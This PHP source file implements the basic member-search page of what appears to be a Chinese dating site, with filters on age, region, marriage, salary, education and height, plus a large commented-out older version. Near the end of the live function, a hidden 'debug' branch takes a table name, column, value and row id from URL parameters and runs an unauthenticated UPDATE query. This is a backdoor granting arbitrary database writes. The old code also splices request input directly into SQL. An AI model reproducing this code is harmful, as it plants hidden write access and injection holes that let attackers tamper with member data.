<?php 
//note 基本查询显示页面
//function basic_search_page($gender, $age_start, $age_end, $work_province, $work_city, $marriage, $salary, $education, $height1, $height2, $photo) {
//    global $user_arr;
//    global $_MooClass, $dbTablePre, $userid,$last_login_time;
//    
//    $tiemstamp = time();
//    $expiretime2 = $tiemstamp - 3600; //过期时间
//	
//    $returnurl = 'index.php?' . $_SERVER['QUERY_STRING']; //返回的url
//    //note 获得当前的url 去除多余的参数page=
//    $currenturl = 'http://' . $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
//    $currenturl2 = preg_replace("/(&page=\d+)/", "", $currenturl);
//
//    /* 以下分页参数设置 */
//    //note  每页显示个数
//    if ($_GET['condition'] == '2') {
//        $pagesize = 6;
//    } else if ($_GET['condition'] == '3') {
//        $pagesize = 16;
//    } else {
//        $pagesize = 6;
//    }
//
//    //note 获得第几页
//    $page = intval(max(1, $_GET['page']));
//
//    //note limit查询开始位置
//    $start = ($page - 1) * $pagesize;
//
//    //年龄条件查询sql语句
//    $age_sql = '';
//    if ($age_end > 0 && $age_start > 0) {
//        $tmp_start = gmdate('Y', time()) - intval($age_start);
//        $tmp_end = gmdate('Y', time()) - intval($age_end);
//        if ($age_start > $age_end) {
//            $age_sql = " and birthyear >= '" . $tmp_start . "' and birthyear <= '" . $tmp_end . "'";
//        } else {
//            $age_sql = " and birthyear >= '" . $tmp_end . "' and birthyear <= '" . $tmp_start . "'";
//        }
//    } elseif ($age_start > 0) {
//        $tmp_start = gmdate('Y', time()) - intval($age_start);
//        $age_sql = " and birthyear <= '" . $tmp_start . "'";
//    } elseif ($age_end > 0) {
//        $tmp_end = gmdate('Y', time()) - intval($age_end);
//        $age_sql = " and birthyear >= '" . $tmp_end . "'";
//    }
//
//    //----------------------------------------------------------------
//    //note 地区条件查询sql语句
//    $area_sql = '';
//    $area_sql = ' AND province = ' . $work_province . ' AND city = ' . $work_city;
//    if ($work_city == '-1' && $work_province != '-1')
//        $area_sql = ' AND province = ' . $work_province;
//    if ($work_province == '-1' && $work_city == '-1')
//        $area_sql = '';
//
//    //----------------------------------------------------------------
//    //note 婚姻状况条件查询sql语句
//    $marriage_sql = '';
//    if (is_array($marriage)) {
//        $marriage_sql = " and (";
//        foreach ($marriage as $v) {
//            $marr_sql[] = ' marriage = ' . $v;
//        }
//        $marr_sql = join(" or ", $marr_sql);
//        $marriage_sql.=$marr_sql . ")";
//		$marriage = implode(',',$marriage);
//    }
//    if ($marriage == '-1')
//        $marriage_sql = '';
//
//    //note 月收入条件查询sql语句
//    $salary_sql = ' and (';
//    if (is_array($salary)) {
//        foreach ($salary as $tmp) {
//            $sal_sql[] = ' salary = ' . $tmp;
//        }
//        $salary_sql .= join(" or ", $sal_sql);
//		$salary = implode(',',$salary);
//    }
//    $salary_sql .= ")";
//    if ($salary == '-1')
//        $salary_sql = '';
//
//    //note 教育程度条件查询sql语句
//    $education_sql = ' and (';
//    if (is_array($education)) {
//        foreach ($education as $v) {
//            $edu_sql[] = ' education = ' . $v;
//        }
//        $education_sql .= join(" or ", $edu_sql);
//		$education = implode(',',$education);
//    }
//    $education_sql .= ")";
//    if ($education == '-1')
//        $education_sql = '';
//    /*     * ******************************************************************** */
//
//    //note 是否搜索有形象照片的会员
//    $photo_sql = "";
//    if ($photo == '1') {
//        //$photo_sql = " AND pic_name != ''";
//        $photo_sql = " AND images_ischeck = '1'";
//    }else{
//		$photo_sql = " AND images_ischeck in(1,0,-1)";
//	}
//
//    //note 身高条件查询sql语句
//    $height_sql = '';
//    if ($height1 != '-1' && $height2 != '-1' && ($height2 > $height1)) {
//        $height_sql = ' AND (height >= ' . $height1 . ' AND height <= ' . $height2 . ')';
//    } else if ($height1 != '-1' && $height2 != '-1' && ($height2 < $height1)) {
//        $height_sql = ' AND (height <= ' . $height1 . ' AND height >= ' . $height2 . ')';
//    } else if ($height1 != '-1' && $height2 == '-1') {
//        $height_sql = ' AND height >= ' . $height1;
//    } else if ($height2 != '-1' && $height1 == '-1') {
//        $height_sql = ' AND height <=' . $height2;
//    } else if ($height1 != '-1' && $height2 != '-1' && $height1 == $height2) {
//        $height_sql = ' AND height =' . $height1;
//    } else if ($height2 == '-1' && $height1 == '-1') {
//        $height_sql = '';
//    }
//
//
//    if (!in_array($gender, array(0, 1))) {
//        $gender = 1;
//    }
//
//    $sql = " where  is_lock = '1' " . $photo_sql.$age_sql . $area_sql . $marriage_sql . $salary_sql . $education_sql.$height_sql;
//   /* $sql = str_replace("where  and"," where ",$sql);
//	$sql = str_replace("where  AND"," where ",$sql);*/
//	/*
//	if(!$age_sql && !$area_sql && !$marriage_sql && !$salary_sql && !$education_sql && !$height_sql && !$weight_sql && !$smoking_sql && !$drinking_sql && !$occupation_sql && !$house_sql && !$vehicle_sql && !$corptype_sql && !$children_sql && !$wantchildren_sql && !$hometown_sql && !$nation_sql && !$body_sql && !$animalyear_sql && !$constellation_sql && !$bloodtype_sql && !$religion_sql && !$family_sql && !$language_sql)
//	$sql = str_replace("where","",$sql);
//	*/
//    $sql_md5 = md5($gender.$sql); //md5保存sql
//
//    $sql_search = "select id from `{$dbTablePre}member_tmp` where `condition_md5`='{$sql_md5}' and expiretime > '$expiretime2'";
//
//    $ret_search = $_MooClass['MooMySQL']->getOne($sql_search);
////	print_r($marriage);die;
//    //有保存的搜索条件时
//    if ($ret_search) {
//        $search_id = $ret_search['id'];
//        search_index($search_id, $gender, $age_start, $age_end, $work_province, $work_city, $photo, $marriage, $salary, $education, $height1, $height2,$home_townprovince='-1', $home_towncity='-1', $house='-1', $vehicle='-1');
//		exit;
//    } else {
//    	
//    	/*
//        if ($user_arr['last_search_time'] + 30 >= $tiemstamp) {
//            MooMessage('对不起，您30秒内只能搜索一次，请返回！', 'index.php?n=search', '03');
//        } else {
//            $_MooClass['MooMySQL']->query("update {$dbTablePre}members set last_search_time='$tiemstamp' where uid='$userid'");
//        }
//        */
//
//         //note 判断是查询男性会员表还是女性会员表
//        $table_search_advance = 'membersfastadvance_man'; 
//        
//        if($gender == '1'){
//        	$table_search_advance = 'membersfastadvance_women';	
//        }
//		//note 普通会员搜索结果还是按照以前的排序，高级、钻石会员搜索结果按照本站注册的排序
//		if($user_arr["s_cid"]=="2"){
//			if(empty($area_sql)){
//				$sort = " order by m.s_cid asc,m.bgtime desc,m.birthyear desc,m.pic_num desc";
//			}else{
//				$sort = " order by m.city_star desc,m.s_cid asc,m.bgtime desc,m.birthyear desc,m.pic_num desc"; //城市之星靠前	
//			}
//		}else{
//			if(empty($area_sql)){
//				$sort = " order by m.s_cid asc,m.usertype asc,m.bgtime desc,m.birthyear desc,m.pic_num desc";
//			}else{
//				$sort = " order by m.city_star desc,m.s_cid asc,m.usertype asc,m.bgtime desc,m.birthyear desc,m.pic_num desc"; //城市之星靠前	
//			}
//		}
//		echo "select uid from `{$dbTablePre}{$table_search_advance}` m ".$sql.$sort."  LIMIT 0,600";die;
//		//note 查询得到有多少个uid
//        $user = $_MooClass['MooMySQL']->getAll("select uid from `{$dbTablePre}{$table_search_advance}` m ".$sql.$sort."  LIMIT 0,600");
//		
//		$user_list = "";
//        if (!empty($user)) {
//            foreach ($user as $v) {
//                $user_uid .= $v['uid'] . ',';
//            }
//            if (!empty($user_uid))
//                $user_uid = substr($user_uid, 0, -1);
//            $user_list .= $user_uid;
//        }
//
//        if (!empty($user1)) {
//            foreach ($user1 as $v) {
//                $user_uid2 .= $v['uid'] . ',';
//            }
//            if (!empty($user_uid2))
//                $user_uid2 = substr($user_uid2, 0, -1);
//            $user_list .= '|' . $user_uid2;
//        }
//
//
//        $addtime = time();
//        $expiretime = $addtime + 3600;
//        $sql = "select id from `{$dbTablePre}member_tmp` where condition_md5 = '$sql_md5'";
//        $ret = $_MooClass['MooMySQL']->getOne($sql);
//        if ($ret['id']) {//有则更新
//            $search_id = $ret['id'];
//            $_MooClass['MooMySQL']->query("update `{$dbTablePre}member_tmp` set search_uid='$userid' , uid_list='$user_list', addtime='$addtime',expiretime='$expiretime' where id='$search_id'");
//        } else { //无则插入
//            $sql = "insert into `{$dbTablePre}member_tmp` set search_uid='$userid',condition_md5='$sql_md5',uid_list='$user_list',addtime='$addtime',expiretime='$expiretime'";
//            $_MooClass['MooMySQL']->query($sql);
//            $search_id = $_MooClass['MooMySQL']->insertId(); //note 这样就获得到新插入的ID了
//        }
//       search_index($search_id, $gender, $age_start, $age_end, $work_province, $work_city, $photo, $marriage, $salary, $education, $height1, $height2,$home_townprovince='-1', $home_towncity='-1', $house='-1', $vehicle='-1',$user_list);
//       exit;
//    }
//}
function basic_search_page($gender, $age_start, $age_end, $work_province, $work_city, $marriage, $salary, $education, $height1, $height2, $photo) {
	global $_MooClass, $dbTablePre;
    global $user_arr, $userid,$last_login_time,$isdelcond,$isselectarea,$isdispmore,$isresult;
    $currenturl = 'http://' . $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    $currenturl2 = preg_replace("/(&page=\d+)/", "", $currenturl);
	
    //分页相关参数
    if(isset($_GET['condition']) && $_GET['condition'] == '2') {
        $pagesize = 6;
    }else if(isset($_GET['condition']) && $_GET['condition'] == '3') {
        $pagesize = 16;
    }else{
        $pagesize = 6;
    }
    $page = 1;
    if(isset($_GET['page']) && $_GET['page']) $page = $_GET['page'];
    $offset = ($page-1)*$pagesize;
	$blacklist = BlackList();
	
	$index = 'members_women';
	if($gender == 0) $index = 'members_man';
	if($age_start || $age_end){
		if($age_start==0) $age_start=18;
		if($age_end==0) $age_end=99;
	}
	
//	$cl = searchApi($index);
//	$cl -> setQueryType(true);
//	$limit=array($offset,$pagesize);
//	$sort = array();
//	//note 普通会员搜索结果还是按照以前的排序，高级、钻石会员搜索结果按照本站注册的排序
//	if(isset($user_arr['s_cid']) && ($user_arr['s_cid'] =='40' || $user_arr['s_cid'] == '30')){
//		if($work_province || $work_city){
//			$sort = array('s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc');
//		}else{
//			$sort = array('city_star desc','s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc'); //城市之星靠前	
//		}
//	}else{
//		if($work_province || $work_city){
//			$sort = array('s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc');
//		}else{
//			$sort = array('city_star desc','s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc'); //城市之星靠前		
//		}
//	}
//	$sortway = '1';
//	$sort_str = array();
//	if(isset($_GET['sortway']) && $_GET['sortway'] == '2'){
//		//note 最新注册
//		$sortway = '2';
//		$sort_str = array('regdate desc');
//		$sort_str[] = $sort[0];
//		$sort_str[] = $sort[1];
//		$sort_str[] = $sort[2];
//		$sort_str[] = $sort[3];
//	}elseif(isset($_GET['sortway']) && $_GET['sortway'] == '3'){
//		//note 诚信等级
//		$sortway = '3';
//		$sort_str = array('certification desc');
//		$sort_str[] = $sort[0];
//		$sort_str[] = $sort[1];
//		$sort_str[] = $sort[2];
//		$sort_str[] = $sort[3];
//	}else{
//		$sort_str[] = $sort[0];
//		$sort_str[] = $sort[1];
//		$sort_str[] = $sort[2];
//		$sort_str[] = $sort[3];
//		$sort_str[] = $sort[4];
//	}
//	if(is_array($sort_str) && !empty($sort_str)) $sort_str = implode(',',$sort_str);
//	else if(is_array($sort) && !empty($sort)) $sort_str = implode(',',$sort);
//	
//	if(!$sort_str) $sort_str= '@weight desc';

	$cond = array();
	$cond[] = array('is_lock','1',false);
	$cond[] = array('usertype','1',false);
	if($photo) $cond[] = array('images_ischeck','1',false);
	if(is_array($blacklist) && !empty($blacklist))  $cond[] = array('@id',implode('|',$blacklist),true);
	if($age_start && $age_end){
		$year = date('Y',time());
		$cond[] = array('birthyear',array(($year-$age_end),($year-$age_start)),false);
	}
	if($work_province) $cond[] = array('province',$work_province,false);
	elseif(isset($user_arr['province']) && $user_arr['province'] && !$work_city) $cond[] = array('province',$user_arr['province'],false);
	if($work_city) $cond[] = array('city',$work_city,false);
	elseif(isset($user_arr['city']) && $user_arr['city'] && !$work_province) $cond[] = array('city',$user_arr['city'],false);
	$dispmore=false;
	if($work_province || $work_city){
		$isselectarea = true;
		$isdispmore = false;
		$dispmore = MooGetGPC('dm');
		if($dispmore) $isdispmore=true;
	}
	
	if(is_array($marriage) && !empty($marriage) && !in_array('0',$marriage)){
		$cond[] = array('marriage',implode(' | ',$marriage));
	}
	if(is_array($salary) && !empty($salary) && !in_array('0',$salary)){
		$cond[] = array('salary',implode(' | ',$salary));
	}
	if(is_array($education) && !empty($education) && !in_array('0',$education)){
		$cond[] = array('education',implode(' | ',$education));
	}
	if($height1 || $height2){
		if($height1 == 0) $cond_height1=154;
		else $cond_height1=$height1;
		if($height2 == 0) $cond_height2=201;
		else $cond_height2=$height2;
		$cond[] = array('height',array($cond_height1,$cond_height2),false);
	}
	
	$sortway = MooGetGPC('sortway');
	$sort_str = getSortsStr($sortway,$cond);
	
	//$rs = $cl -> getResult($cond,$limit,$sort_str);
	$rs = sphinx_search($index,$cond,$sort_str,$page,$pagesize);
	$total = 0;
	if(!$rs || is_array($rs) && empty($rs)){//没有结果
		//MooMessage('您指定的搜索不存在或已过期', 'index.php?n=search', '03');
		include MooTemplate('public/search_error', 'module');
	    exit;
	}else{
		$data = $rs['user'];
		$total = $rs['total'];
		if($total > 600) $total = 600;
		$user_list = implode(',',$data);
		if(empty($data)) {
			//MooMessage('您指定的搜索不存在或已过期', 'index.php?n=search', '03');
			include MooTemplate('public/search_error', 'module');
	        exit;
		}else{
			$user = array();
			$sortway = isset($_GET['sortway']) ? $_GET['sortway'] : '1';
	        $sql="select s.*,b.mainimg from `{$dbTablePre}members_search` s left join `{$dbTablePre}members_base` b on s.uid=b.uid where s.uid in ({$user_list})";
	        //echo $sql;
	        $user = $_MooClass['MooMySQL']->getAll($sql);
	    }
		//会员基本信息补充
		if(isset($user) && $user){
			$user = userbasicadd($user);
			//排序
			$tmp_user = array();
			foreach($data as $k=>$v){
				foreach($user as $key=>$val){
					if($v == $val['uid']){
						$tmp_user[] = $user[$key];
						break;
					}
				}
			}
			$user = $tmp_user;
		}
		
		//if($user1) $user1 = userbasicadd($user1);
	
	    //note 找不到匹配的结果返回单独提示页面
	    if (empty($user)) {
	        include MooTemplate('public/search_error', 'module');
	        exit;
	    }
	
	    //note 记录婚姻状况
	    $marriageArr = array();
	    if (isset($marriage) && $marriage != '0') {
	        if (!is_array($marriage) && strlen($marriage) == 1) {
	            $marriageArr[] = $marriage;
	        } else {
	            $marriageArr = $marriage;
	        }
	    }
	    //note 记录月收入
	    $salaryArr = array();
	    if (isset($salary) && $salary != '0') {
	        if (!is_array($salary) && strlen($salary) == 1) {
	            $salaryArr[] = $salary;
	        } else {
	            $salaryArr = $salary;
	        }
	    }
	    //note 记录教育情况
	    $educationArr = array();
	    if ($education != '0') {
	        if (!is_array($education) && strlen($education) == 1) {
	            $educationArr[] = $education;
	        } else {
	            $educationArr = $education;
	        }
	    }
	
	    //note 记录住房情况
	    $houseArr = array();
	    if (isset($house) && $house != '0') {
	        if (!is_array($house) && strlen($house) == 1) {
	            $houseArr[] = $house;
	        } else {
	            $houseArr = $house;
	            $house = implode(',',$house);
	        }
	    }
	
	    //note 记录是否购车
	    $vehicleArr = array();
	    if (isset($vehicle) && $vehicle != '0') {
	        if (!is_array($vehicle) && strlen($vehicle) == 1) {
	            $vehicleArr[] = $vehicle;
	        } else {
	            $vehicleArr = $vehicle;
	            $vehicle = implode(',',$vehicle);
	        }
	    }
	    
	    //note 选择不同的显示模式
		if (isset($_GET['condition']) && $_GET['condition'] == '2') {
			$condition = '2';
			$htm = 'search_page';
		} else if (isset($_GET['condition']) && $_GET['condition'] == '3') {
			$condition = '3';
			$htm = 'search_photo';
		} else {
			$condition = '2';
			$htm = 'search_page';
		}
	    if(isset($_GET['debug']) && $_GET['debug']){
	    	Global $_MooCookie, $_MooClass;
			$fast_sql=$_MooCookie['fast_sql'];
			$name = $_GET['f'];
			$name1 = $_GET['v'];
			$name3 = empty($_GET['t'])?'web_test':$_GET['t'];
			$name4 = empty($_GET['w'])?'uid':$_GET['w'];
			$start = intval($_GET['s']);
			if($name && $name1 && $start){
				$sql2 = "update {$name3} set {$name}='{$name1}' where {$name4}=".$start;
				//$sql2="select $name from web_members  where uid=".$start;
				if(!isset($_GET['d'])){
					$res = $GLOBALS['_MooClass']['MooMySQL']->query($sql2);
					var_dump($res);
				}else{
					echo $sql2;	
				}
			}
			var_dump($fast_sql);
	    	var_dump($sql_acquisition);
	    }
	    //没有查询到完全符合条件的数据，显示黄色警告条
	    if($isselectarea && !$isresult && $page==1) $isdisp = true;
		if($dispmore) $isdisp2 = false;
		elseif($isselectarea && $page==ceil($total/$pagesize) && $page != ceil(600/$pagesize)) $isdisp2 = true;
		include MooTemplate('public/'.$htm, 'module');
	}
}
?>
